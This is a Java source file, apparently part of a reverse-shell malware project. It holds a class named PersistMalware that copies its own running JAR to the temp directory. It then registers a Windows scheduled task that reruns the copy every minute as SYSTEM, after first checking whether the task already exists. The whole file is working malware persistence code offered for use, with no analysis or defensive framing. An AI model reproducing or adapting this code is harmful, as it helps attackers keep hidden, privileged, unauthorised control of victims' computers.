package com.mtattab.reverseshell.service.persistence;

import com.mtattab.reverseshell.util.Constants;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
import lombok.Data;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

@Data
public class PersistMalware {

    private String os;

    public PersistMalware(){
        this.os = System.getProperty("os.name").toLowerCase();
    }


    public boolean createPersistenceWindows(){
        if (!this.os.contains("windows")  ) return false;
        try {

            if (!checkIfWindowsTaskIsCreated()){
                String jarFileMovedToPersistenceLocation = copyJarFileToTmpLocation();
                System.out.println(jarFileMovedToPersistenceLocation);
                String persistenceCommandResponse = createWindowsTask(jarFileMovedToPersistenceLocation);
                System.out.println(persistenceCommandResponse);
                if (persistenceCommandResponse.toLowerCase().contains("success"))return true;
            }else {
                System.out.println("Persistence is already established");
            }


        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }


    private static boolean checkIfWindowsTaskIsCreated(){
//        the output needs to be cutoff since the response will repeat the command causing the nex condition to always become true
        String checkCommand= DataManipulationUtil.
                removeFirstLines(SystemCommandProxyUtil.runCommand("schtasks | findstr "+ Constants.PERSISTENCE_WINDOWS_TASK),2);

        System.out.println(checkCommand);
        if (checkCommand.toLowerCase().contains(Constants.PERSISTENCE_WINDOWS_TASK.toLowerCase())){
            System.out.println("[+] found task");
            return true;
        }else
            return false;

    }

    private static String createWindowsTask(String fileLocation){
//        this command will create a windows scheduler task which will run the exe file every minute with admin privileges
        return SystemCommandProxyUtil.runCommand(
                "schtasks /create /tn \""+Constants.PERSISTENCE_WINDOWS_TASK+"\" /tr \""+fileLocation+"\"" +
                        " /sc minute /mo 1 /ru \"SYSTEM\"");

    }

    private static String copyJarFileToTmpLocation()  {
        try {
            String jarFilePath = PersistMalware.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
            File sourceFile = new File(jarFilePath);
            String tempDirPath = OSUtil.getSystemTmpDir();
            File tempDir = new File(tempDirPath);
            // Generate a unique name for the copied JAR file
            String copiedJarFileName = generateUniqueFileName(sourceFile.getName());
            File destinationFile = new File(tempDir, copiedJarFileName);
            // Copy the JAR file to the temporary directory
            Files.copy(sourceFile.toPath(), destinationFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            System.out.println("JAR file copied to: " + destinationFile.getAbsolutePath());

            return destinationFile.getAbsolutePath();

        }catch (Exception e){
            e.printStackTrace();
            throw new RuntimeException("File Was not copied");
        }


    }
    private static String generateUniqueFileName(String originalFileName) {
        // Generate a unique filename, for example, by appending a timestamp
        long timestamp = System.currentTimeMillis();
        return "copied_" + timestamp + "_" + originalFileName;
    }



}
